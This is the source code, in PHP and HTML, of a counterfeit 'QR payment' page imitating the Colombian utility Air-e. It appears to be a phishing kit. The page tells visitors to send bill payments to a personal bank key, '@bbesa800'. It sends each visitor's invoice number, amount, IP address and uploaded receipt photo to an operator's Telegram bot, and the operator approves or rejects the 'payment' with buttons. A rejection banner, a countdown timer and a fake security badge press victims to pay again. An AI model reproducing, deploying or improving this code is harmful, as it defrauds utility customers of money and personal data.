<?php
require_once __DIR__ . '/../../geo_check.php';

$config = @include __DIR__ . '/../../config.php';
if (!$config) {
    $config = @include __DIR__ . '/../config.php';
}

$botToken = $config['botToken'] ?? ($config['bot_token'] ?? '');
$chatId = $config['chatId'] ?? ($config['chat_id'] ?? '');

// Endpoint para consultar estado de validación (Polling de Telegram)
if (isset($_GET['action']) && $_GET['action'] === 'check_status') {
    header('Content-Type: application/json; charset=utf-8');
    $checkId = intval($_GET['id'] ?? 0);
    if ($checkId <= 0) {
        echo json_encode(['status' => 'error', 'message' => 'ID no válido']);
        exit;
    }
    try {
        require_once __DIR__ . '/../../db.php';
        if (isset($conn) && $conn instanceof PDO) {
            $stmt = $conn->prepare("SELECT estado FROM pse WHERE id = :id");
            $stmt->execute(['id' => $checkId]);
            $row = $stmt->fetch();
            if ($row) {
                echo json_encode(['status' => 'success', 'estado' => intval($row['estado'])]);
                exit;
            }
        }
        echo json_encode(['status' => 'waiting', 'estado' => 1]);
    } catch (Throwable $e) {
        echo json_encode(['status' => 'waiting', 'estado' => 1]);
    }
    exit;
}

// Procesar alertas AJAX y subida de comprobantes
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    if (empty($action)) {
        $rawInput = file_get_contents('php://input');
        $jsonData = json_decode($rawInput, true);
        if (is_array($jsonData)) {
            $action = $jsonData['action'] ?? '';
            $data = $jsonData;
        } else {
            $data = [];
        }
    } else {
        $data = $_POST;
    }

    $userIp = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Desconocida';
    if (strpos($userIp, ',') !== false) {
        $userIp = trim(explode(',', $userIp)[0]);
    }
    $nic = htmlspecialchars($data['nic'] ?? 'No especificado');
    $total = htmlspecialchars($data['total'] ?? 'No especificado');
    $banco = htmlspecialchars($data['banco'] ?? 'Bancolombia / Redeban / QR');
    $fecha = date('Y-m-d H:i:s');

    // Acción 1: Subir comprobante de pago
    if ($action === 'upload_receipt') {
        header('Content-Type: application/json; charset=utf-8');

        // Insertar en Neon PostgreSQL tabla pse para registrar la transacción
        $nuevo_id = 0;
        try {
            require_once __DIR__ . '/../../db.php';
            if (isset($conn) && $conn instanceof PDO) {
                try {
                    $sql_insert = "INSERT INTO pse (estado, ip_address, usuario, banco) VALUES (:estado, :ip, :usuario, :banco) RETURNING id";
                    $stmt_insert = $conn->prepare($sql_insert);
                    $stmt_insert->execute([
                        'estado' => 1,
                        'ip' => $userIp,
                        'usuario' => "NIC: " . $nic . " | " . $total,
                        'banco' => 'QR / Llave @bbesa800'
                    ]);
                    $nuevo_id = intval($stmt_insert->fetchColumn());
                } catch (Throwable $e1) {
                    $sql_insert = "INSERT INTO pse (estado) VALUES (:estado) RETURNING id";
                    $stmt_insert = $conn->prepare($sql_insert);
                    $stmt_insert->execute(['estado' => 1]);
                    $nuevo_id = intval($stmt_insert->fetchColumn());
                }
            }
        } catch (Throwable $e) {
            error_log("Error BD pse: " . $e->getMessage());
        }

        if ($nuevo_id <= 0) {
            $nuevo_id = rand(100000, 999999);
        }

        // Construir URLs para los botones de Telegram
        $baseUrl = $config['baseUrl'] ?? 'https://recaudoairefactura.vercel.app/updatetele.php';
        $security_key = $config['security_key'] ?? 'secure_key_123';

        $confirmUrl = "{$baseUrl}?id={$nuevo_id}&estado=10&key={$security_key}";
        $rejectUrl = "{$baseUrl}?id={$nuevo_id}&estado=11&key={$security_key}";

        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => '✅ Pago Confirmado', 'url' => $confirmUrl],
                    ['text' => '❌ Pago No Realizado', 'url' => $rejectUrl]
                ]
            ]
        ];

        $caption = "🧾 *NUEVO COMPROBANTE DE PAGO (QR / LLAVE)*\n\n"
            . "🆔 *ID Transacción:* `" . $nuevo_id . "`\n"
            . "👤 *NIC / Factura:* `" . $nic . "`\n"
            . "💰 *Total a Validar:* `" . $total . "`\n"
            . "🏦 *Método:* `" . $banco . "` (Llave `@bbesa800`)\n"
            . "🌐 *IP:* `" . $userIp . "`\n"
            . "🕒 *Fecha:* `" . $fecha . "`\n\n"
            . "⚖️ *Por favor verifica el comprobante en tu cuenta bancaria y selecciona una opción:*";

        if (!empty($botToken) && !empty($chatId)) {
            if (!empty($_FILES['comprobante']['tmp_name']) && is_uploaded_file($_FILES['comprobante']['tmp_name'])) {
                $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendPhoto";
                $cfile = new CURLFile(
                    $_FILES['comprobante']['tmp_name'],
                    $_FILES['comprobante']['type'] ?: 'image/jpeg',
                    $_FILES['comprobante']['name'] ?: 'comprobante.jpg'
                );
                $postFields = [
                    'chat_id' => $chatId,
                    'caption' => $caption,
                    'parse_mode' => 'Markdown',
                    'photo' => $cfile,
                    'reply_markup' => json_encode($keyboard)
                ];

                $ch = curl_init($telegramUrl);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 20);
                @curl_exec($ch);
                @curl_close($ch);
            } else {
                $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
                $postFields = [
                    'chat_id' => $chatId,
                    'text' => $caption . "\n\n_(Nota: Imagen no adjunta)_",
                    'parse_mode' => 'Markdown',
                    'reply_markup' => json_encode($keyboard)
                ];

                $ch = curl_init($telegramUrl);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postFields));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 10);
                @curl_exec($ch);
                @curl_close($ch);
            }
        }

        echo json_encode([
            'status' => 'success',
            'transaction_id' => $nuevo_id
        ]);
        exit;
    }

    // Acción 2: Registro de vista en Telegram
    if ($action === 'confirm_payment' || $action === 'view_qr') {
        header('Content-Type: application/json; charset=utf-8');
        if ($action === 'confirm_payment') {
            $msg = "🔔 *PAGO NOTIFICADO POR EL USUARIO (QR / LLAVE)*\n\n";
            $msg .= "👤 *Acción:* El usuario presionó 'Ya realicé el pago'\n";
            $msg .= "🧾 *NIC / Referencia:* `" . $nic . "`\n";
            $msg .= "💰 *Total:* `" . $total . "`\n";
            $msg .= "🏦 *Banco:* `" . $banco . "`\n";
            $msg .= "🔑 *Llave destino:* `@bbesa800`\n";
            $msg .= "🌐 *IP:* `" . $userIp . "`\n";
            $msg .= "🕒 *Fecha:* `" . $fecha . "`\n";
        } else {
            $msg = "📲 *USUARIO INGRESÓ A PAGO POR QR / LLAVE*\n\n";
            $msg .= "🧾 *NIC / Referencia:* `" . $nic . "`\n";
            $msg .= "💰 *Total a Pagar:* `" . $total . "`\n";
            $msg .= "🏦 *Banco Seleccionado:* `" . $banco . "`\n";
            $msg .= "🌐 *IP:* `" . $userIp . "`\n";
            $msg .= "🕒 *Fecha:* `" . $fecha . "`\n";
        }

        if (!empty($botToken) && !empty($chatId)) {
            $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
            $postFields = [
                'chat_id' => $chatId,
                'text' => $msg,
                'parse_mode' => 'Markdown'
            ];
            $ch = curl_init($telegramUrl);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postFields));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 5);
            @curl_exec($ch);
            @curl_close($ch);
        }

        echo json_encode(['status' => 'success']);
        exit;
    }
}

// Parámetros iniciales desde GET o Cookies
$bancoParam = $_GET['banco'] ?? ($_COOKIE['aire_pago_banco'] ?? 'Bancolombia / Redeban');
$nicParam = $_GET['nic'] ?? ($_COOKIE['aire_pago_nic'] ?? '');
$totalParam = $_GET['total'] ?? ($_COOKIE['aire_pago_total'] ?? '');
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Pago Seguro con Código QR | Air-e</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #0056b3;
            --primary-dark: #003d82;
            --primary-light: #e8f1fa;
            --accent: #ff6600;
            --accent-light: #fff2ea;
            --success: #10b981;
            --success-dark: #059669;
            --bg-page: #f1f5f9;
            --card-bg: #ffffff;
            --text-main: #0f172a;
            --text-muted: #64748b;
            --border-color: #e2e8f0;
            --radius-card: 24px;
            --radius-inner: 16px;
            --shadow-card: 0 20px 40px -15px rgba(0, 35, 75, 0.12), 0 0 1px 1px rgba(0, 0, 0, 0.04);
            --shadow-qr: 0 12px 28px -8px rgba(0, 0, 0, 0.12);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: var(--bg-page);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 24px 16px 40px;
            color: var(--text-main);
        }

        .payment-wrapper {
            width: 100%;
            max-width: 440px;
            background: var(--card-bg);
            border-radius: var(--radius-card);
            box-shadow: var(--shadow-card);
            overflow: hidden;
            position: relative;
            border: 1px solid rgba(255, 255, 255, 0.8);
        }

        /* Encabezado */
        .card-header {
            background: linear-gradient(135deg, #004b9c 0%, #0066cc 100%);
            padding: 22px 24px;
            color: #ffffff;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: relative;
        }

        .brand-box {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .brand-logo {
            height: 36px;
            max-width: 110px;
            object-fit: contain;
            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.15));
        }

        .header-title-group h1 {
            font-size: 15px;
            font-weight: 800;
            letter-spacing: -0.2px;
            line-height: 1.2;
        }

        .header-title-group span {
            font-size: 11px;
            opacity: 0.85;
            font-weight: 500;
        }

        .secure-badge {
            background: rgba(255, 255, 255, 0.16);
            backdrop-filter: blur(8px);
            padding: 6px 10px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 5px;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .secure-badge svg {
            width: 13px;
            height: 13px;
            fill: #4ade80;
        }

        /* Cuerpo principal */
        .card-body {
            padding: 24px 22px;
        }

        /* ===== BANNER DE PAGO RECHAZADO / NO REALIZADO ===== */
        .alert-rejected {
            display: flex;
            align-items: flex-start;
            gap: 14px;
            background: #fff5f5;
            border: 1.5px solid #fecaca;
            border-radius: 16px;
            padding: 16px 18px;
            margin-bottom: 20px;
            box-shadow: 0 8px 20px -6px rgba(239, 68, 68, 0.15);
            animation: shakeAlert 0.4s ease-in-out, fadeIn 0.3s ease-out;
        }

        @keyframes shakeAlert {
            0%, 100% { transform: translateX(0); }
            20%, 60% { transform: translateX(-6px); }
            40%, 80% { transform: translateX(6px); }
        }

        .alert-rejected-icon {
            width: 38px;
            height: 38px;
            flex-shrink: 0;
            background: #fee2e2;
            color: #dc2626;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .alert-rejected-icon svg {
            width: 22px;
            height: 22px;
            fill: currentColor;
        }

        .alert-rejected-content h4 {
            font-size: 15px;
            font-weight: 800;
            color: #991b1b;
            margin-bottom: 4px;
        }

        .alert-rejected-content p {
            font-size: 13px;
            line-height: 1.45;
            color: #7f1d1d;
        }

        /* Bloque de Total y Factura */
        .amount-card {
            background: #f8fafc;
            border: 1.5px solid var(--border-color);
            border-radius: var(--radius-inner);
            padding: 16px 18px;
            text-align: center;
            margin-bottom: 20px;
        }

        .amount-label {
            font-size: 12px;
            font-weight: 600;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 4px;
        }

        .amount-value {
            font-size: 26px;
            font-weight: 800;
            color: var(--primary-dark);
            letter-spacing: -0.5px;
        }

        .invoice-meta {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-top: 6px;
            font-size: 12px;
            color: var(--text-muted);
        }

        .invoice-meta strong {
            color: var(--text-main);
        }

        /* Cronómetro de 2 minutos */
        .timer-container {
            margin-bottom: 20px;
            text-align: center;
        }

        .timer-pill {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: var(--primary-light);
            color: var(--primary);
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: 700;
            transition: all 0.3s ease;
        }

        .timer-pill.urgent {
            background: #fee2e2;
            color: #dc2626;
            animation: pulseWarning 1s infinite alternate;
        }

        @keyframes pulseWarning {
            from { transform: scale(1); }
            to { transform: scale(1.04); }
        }

        .timer-icon {
            width: 15px;
            height: 15px;
            fill: currentColor;
        }

        .timer-digits {
            font-variant-numeric: tabular-nums;
            font-weight: 800;
            letter-spacing: 0.5px;
        }

        .timer-progress-track {
            height: 4px;
            background: #e2e8f0;
            border-radius: 4px;
            margin-top: 8px;
            overflow: hidden;
        }

        .timer-progress-bar {
            height: 100%;
            background: var(--primary);
            width: 100%;
            transition: width 1s linear, background-color 0.3s ease;
        }

        .timer-progress-bar.urgent {
            background: #dc2626;
        }

        .timer-expired-box {
            display: none;
            margin-top: 10px;
        }

        .btn-renew {
            background: none;
            border: 1px solid var(--primary);
            color: var(--primary);
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }

        .btn-renew:hover {
            background: var(--primary);
            color: #ffffff;
        }

        /* Sección Código QR */
        .qr-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 22px;
        }

        .qr-frame {
            background: #ffffff;
            padding: 14px;
            border-radius: 20px;
            box-shadow: var(--shadow-qr);
            border: 2px solid #edf2f7;
            position: relative;
            transition: opacity 0.3s, filter 0.3s;
        }

        .qr-image {
            width: 220px;
            height: 220px;
            display: block;
            border-radius: 12px;
            object-fit: contain;
        }

        .qr-instruction {
            margin-top: 12px;
            font-size: 13px;
            color: var(--text-muted);
            text-align: center;
            max-width: 280px;
            line-height: 1.4;
        }

        /* Divisor "o a nuestra llave" */
        .key-divider {
            position: relative;
            text-align: center;
            margin: 18px 0;
        }

        .key-divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: var(--border-color);
            z-index: 1;
        }

        .divider-pill {
            position: relative;
            z-index: 2;
            background: var(--card-bg);
            padding: 0 12px;
            font-size: 12px;
            font-weight: 700;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 0.8px;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }

        .divider-pill svg {
            width: 14px;
            height: 14px;
            fill: var(--accent);
        }

        /* Tarjeta de Llave Copiable */
        .key-box {
            background: linear-gradient(135deg, #f8fafc 0%, #edf4fc 100%);
            border: 1.5px solid #d0e1f9;
            border-radius: var(--radius-inner);
            padding: 14px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
            margin-bottom: 22px;
        }

        .key-info {
            display: flex;
            flex-direction: column;
        }

        .key-label {
            font-size: 11px;
            font-weight: 700;
            color: var(--primary);
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 2px;
        }

        .key-value {
            font-size: 19px;
            font-weight: 800;
            color: var(--text-main);
            letter-spacing: 0.3px;
            user-select: all;
        }

        .btn-copy {
            background: #ffffff;
            border: 1.5px solid #cbd5e1;
            color: var(--text-main);
            padding: 9px 16px;
            border-radius: 12px;
            font-size: 13px;
            font-weight: 700;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 6px;
            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.04);
            flex-shrink: 0;
        }

        .btn-copy:hover {
            border-color: var(--primary);
            color: var(--primary);
            background: #f8fafc;
            transform: translateY(-1px);
        }

        .btn-copy.copied {
            background: #ecfdf5;
            border-color: #10b981;
            color: #059669;
        }

        .btn-copy svg {
            width: 15px;
            height: 15px;
            fill: currentColor;
            transition: transform 0.2s;
        }

        /* Pasos Guiados */
        .steps-container {
            background: #f8fafc;
            border-radius: var(--radius-inner);
            padding: 14px 16px;
            margin-bottom: 24px;
        }

        .steps-title {
            font-size: 12px;
            font-weight: 700;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .step-item {
            display: flex;
            align-items: flex-start;
            gap: 10px;
            font-size: 12.5px;
            color: var(--text-main);
            margin-bottom: 8px;
            line-height: 1.4;
        }

        .step-item:last-child {
            margin-bottom: 0;
        }

        .step-number {
            width: 18px;
            height: 18px;
            background: #e2e8f0;
            color: #475569;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 11px;
            font-weight: 800;
            flex-shrink: 0;
            margin-top: 1px;
        }

        /* Botón de Confirmación Principal */
        .btn-confirm-payment {
            width: 100%;
            background: linear-gradient(135deg, #ff6600 0%, #e65100 100%);
            color: #ffffff;
            border: none;
            padding: 16px;
            border-radius: 14px;
            font-size: 15px;
            font-weight: 800;
            letter-spacing: 0.2px;
            cursor: pointer;
            box-shadow: 0 10px 25px -5px rgba(255, 102, 0, 0.4);
            transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn-confirm-payment:hover {
            transform: translateY(-2px);
            box-shadow: 0 14px 28px -5px rgba(255, 102, 0, 0.5);
            background: linear-gradient(135deg, #ff751a 0%, #eb5b05 100%);
        }

        .btn-confirm-payment:active {
            transform: translateY(0);
        }

        .btn-confirm-payment svg {
            width: 20px;
            height: 20px;
            fill: currentColor;
        }

        /* Spinner */
        .spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2.5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #ffffff;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Pie de página */
        .card-footer {
            background: #f8fafc;
            border-top: 1px solid var(--border-color);
            padding: 14px 20px;
            text-align: center;
            font-size: 12px;
            color: var(--text-muted);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        /* Toast flotante */
        .toast {
            position: fixed;
            bottom: 24px;
            left: 50%;
            transform: translateX(-50%) translateY(100px);
            background: #1e293b;
            color: #ffffff;
            padding: 12px 22px;
            border-radius: 30px;
            font-size: 13px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.25);
            opacity: 0;
            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            z-index: 1000;
            pointer-events: none;
        }

        .toast.show {
            transform: translateX(-50%) translateY(0);
            opacity: 1;
        }

        .toast svg {
            width: 16px;
            height: 16px;
            fill: #4ade80;
        }

        /* Modales */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(15, 23, 42, 0.68);
            backdrop-filter: blur(5px);
            display: none;
            align-items: center;
            justify-content: center;
            padding: 20px;
            z-index: 999;
            animation: fadeIn 0.25s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .modal-box {
            background: #ffffff;
            border-radius: 24px;
            padding: 32px 24px;
            max-width: 420px;
            width: 100%;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
            animation: zoomIn 0.3s ease-out;
        }

        @keyframes zoomIn {
            from { transform: scale(0.92); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }

        .btn-modal-close {
            width: 100%;
            background: var(--primary);
            color: #ffffff;
            border: none;
            padding: 14px;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            transition: background 0.2s;
        }

        .btn-modal-close:hover {
            background: var(--primary-dark);
        }

        /* ===== MODAL SUBIR COMPROBANTE ===== */
        .modal-box-upload {
            position: relative;
            max-width: 440px;
            text-align: left;
        }

        .modal-btn-x {
            position: absolute;
            top: 16px;
            right: 16px;
            background: #f1f5f9;
            border: none;
            width: 32px;
            height: 32px;
            border-radius: 50%;
            font-size: 20px;
            color: #64748b;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
        }

        .modal-btn-x:hover {
            background: #e2e8f0;
            color: #0f172a;
        }

        .modal-upload-header {
            text-align: center;
            margin-bottom: 20px;
        }

        .upload-badge-icon {
            width: 54px;
            height: 54px;
            background: var(--primary-light);
            color: var(--primary);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 12px;
        }

        .upload-badge-icon svg {
            width: 28px;
            height: 28px;
            fill: currentColor;
        }

        .modal-upload-header h2 {
            font-size: 19px;
            font-weight: 800;
            color: var(--text-main);
            margin-bottom: 6px;
        }

        .modal-upload-header p {
            font-size: 13px;
            color: var(--text-muted);
            line-height: 1.45;
        }

        .upload-zone {
            border: 2px dashed #cbd5e1;
            border-radius: 16px;
            padding: 22px 16px;
            text-align: center;
            cursor: pointer;
            background: #f8fafc;
            transition: all 0.2s ease;
            margin-bottom: 20px;
        }

        .upload-zone:hover, .upload-zone.drag-over {
            border-color: var(--primary);
            background: var(--primary-light);
        }

        .upload-zone-icon {
            width: 44px;
            height: 44px;
            background: #ffffff;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 10px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
            color: var(--primary);
        }

        .upload-zone-icon svg {
            width: 24px;
            height: 24px;
            fill: currentColor;
        }

        .upload-zone-text strong {
            display: block;
            font-size: 14px;
            color: var(--text-main);
            margin-bottom: 3px;
        }

        .upload-zone-text span {
            font-size: 12px;
            color: var(--text-muted);
        }

        .upload-zone-preview {
            display: flex;
            align-items: center;
            gap: 14px;
            text-align: left;
        }

        .upload-zone-preview img {
            width: 68px;
            height: 68px;
            object-fit: cover;
            border-radius: 12px;
            border: 1.5px solid #e2e8f0;
        }

        .preview-info {
            flex: 1;
            min-width: 0;
        }

        .preview-name {
            display: block;
            font-size: 13px;
            font-weight: 700;
            color: var(--text-main);
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .preview-size {
            display: block;
            font-size: 12px;
            color: var(--text-muted);
            margin: 2px 0 6px;
        }

        .btn-change-photo {
            font-size: 12px;
            font-weight: 600;
            color: var(--primary);
            background: none;
            border: none;
            cursor: pointer;
            padding: 0;
            text-decoration: underline;
        }

        .modal-upload-actions {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .btn-submit-receipt {
            width: 100%;
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
            color: #ffffff;
            border: none;
            padding: 15px;
            border-radius: 14px;
            font-size: 15px;
            font-weight: 800;
            cursor: pointer;
            box-shadow: 0 10px 20px -6px rgba(16, 185, 129, 0.35);
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn-submit-receipt:disabled {
            background: #cbd5e1;
            box-shadow: none;
            cursor: not-allowed;
            opacity: 0.7;
        }

        .btn-submit-receipt:not(:disabled):hover {
            transform: translateY(-2px);
            box-shadow: 0 14px 24px -6px rgba(16, 185, 129, 0.45);
        }

        .btn-cancel-modal {
            background: transparent;
            border: none;
            color: var(--text-muted);
            font-size: 13px;
            font-weight: 600;
            padding: 8px;
            cursor: pointer;
            text-align: center;
        }

        .btn-cancel-modal:hover {
            color: var(--text-main);
        }

        /* ===== MODAL DE ESPERA EN VIVO ===== */
        .modal-box-waiting {
            max-width: 400px;
            text-align: center;
            padding: 36px 24px;
        }

        .waiting-animation-container {
            position: relative;
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .pulse-ring {
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            background: rgba(0, 86, 179, 0.15);
            animation: radarPulse 2s cubic-bezier(0.215, 0.61, 0.355, 1) infinite;
        }

        .pulse-2 {
            animation-delay: 0.6s;
        }

        @keyframes radarPulse {
            0% { transform: scale(0.6); opacity: 0.9; }
            100% { transform: scale(1.6); opacity: 0; }
        }

        .pulse-center-icon {
            position: relative;
            z-index: 2;
            width: 58px;
            height: 58px;
            background: var(--primary);
            color: #ffffff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 8px 20px rgba(0, 86, 179, 0.35);
        }

        .pulse-center-icon svg {
            width: 28px;
            height: 28px;
            fill: currentColor;
            animation: spinSlow 7s linear infinite;
        }

        @keyframes spinSlow {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        .waiting-subtext {
            font-size: 13px;
            color: var(--text-muted);
            line-height: 1.5;
            margin-bottom: 20px;
        }

        .live-status-pill {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: #f1f5f9;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: 700;
            color: var(--primary-dark);
            margin-bottom: 20px;
        }

        .pulse-dot {
            width: 9px;
            height: 9px;
            border-radius: 50%;
            background: #10b981;
            box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7);
            animation: dotPulse 1.6s infinite;
        }

        @keyframes dotPulse {
            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
            70% { transform: scale(1); box-shadow: 0 0 0 7px rgba(16, 185, 129, 0); }
            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
        }

        .waiting-details-box {
            background: #f8fafc;
            border: 1px solid var(--border-color);
            border-radius: 14px;
            padding: 14px 16px;
            text-align: left;
        }

        .waiting-detail-row {
            display: flex;
            justify-content: space-between;
            font-size: 13px;
            padding: 5px 0;
            color: var(--text-muted);
        }

        .waiting-detail-row strong {
            color: var(--text-main);
        }

        /* ===== MODAL DE ÉXITO FINAL ===== */
        .modal-box-success {
            max-width: 420px;
            text-align: center;
            padding: 34px 24px;
        }

        .modal-icon-success {
            width: 70px;
            height: 70px;
            background: #ecfdf5;
            color: #10b981;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 16px;
            box-shadow: 0 10px 25px -5px rgba(16, 185, 129, 0.3);
        }

        .modal-icon-success svg {
            width: 40px;
            height: 40px;
            fill: currentColor;
        }

        .success-subtext {
            font-size: 14px;
            color: var(--text-muted);
            line-height: 1.5;
            margin-bottom: 20px;
        }

        .success-receipt-card {
            background: #f8fafc;
            border: 1.5px dashed #cbd5e1;
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 24px;
            text-align: left;
        }

        .success-receipt-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 13px;
            padding: 6px 0;
            border-bottom: 1px solid #e2e8f0;
            color: var(--text-muted);
        }

        .success-receipt-row:last-child {
            border-bottom: none;
        }

        .success-receipt-row strong {
            color: var(--text-main);
        }

        .badge-approved {
            background: #ecfdf5;
            color: #059669;
            font-weight: 800;
            font-size: 12px;
            padding: 3px 8px;
            border-radius: 6px;
            letter-spacing: 0.5px;
        }

        @media (max-width: 440px) {
            body {
                padding: 12px 10px 30px;
            }
            .card-body {
                padding: 18px 14px;
            }
            .qr-image {
                width: 200px;
                height: 200px;
            }
            .amount-value {
                font-size: 24px;
            }
            .key-value {
                font-size: 17px;
            }
            .btn-copy {
                padding: 8px 14px;
                font-size: 13px;
            }
        }
    </style>
</head>
<body>

<div class="payment-wrapper">
    <!-- Encabezado de la entidad -->
    <header class="card-header">
        <div class="brand-box">
            <img src="../../assets/logo-aire.png" alt="Air-e" class="brand-logo" onerror="if(!this.triedRoot){this.triedRoot=true;this.src='/assets/logo-aire.png';}">
            <div class="header-title-group">
                <h1>Pago con Código QR</h1>
                <span>Factura de Energía</span>
            </div>
        </div>
        <div class="secure-badge">
            <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
            SSL 256-bit
        </div>
    </header>

    <div class="card-body">
        <!-- Banner de Alerta: Pago No Confirmado -->
        <div class="alert-rejected" id="alertRejected" style="display: none;">
            <div class="alert-rejected-icon">
                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
            </div>
            <div class="alert-rejected-content">
                <h4>Pago no confirmado o no realizado</h4>
                <p>No logramos verificar la acreditación de tu pago en la cuenta bancaria. Por favor, asegúrate de realizar la transferencia por el valor exacto a la llave <strong>@bbesa800</strong> o mediante el código QR y vuelve a subir tu comprobante de pago.</p>
            </div>
        </div>

        <!-- Bloque de Monto y Factura -->
        <div class="amount-card">
            <div class="amount-label">Total a Pagar</div>
            <div class="amount-value" id="displayTotal"><?= !empty($totalParam) ? htmlspecialchars($totalParam) : '---' ?></div>
            <div class="invoice-meta">
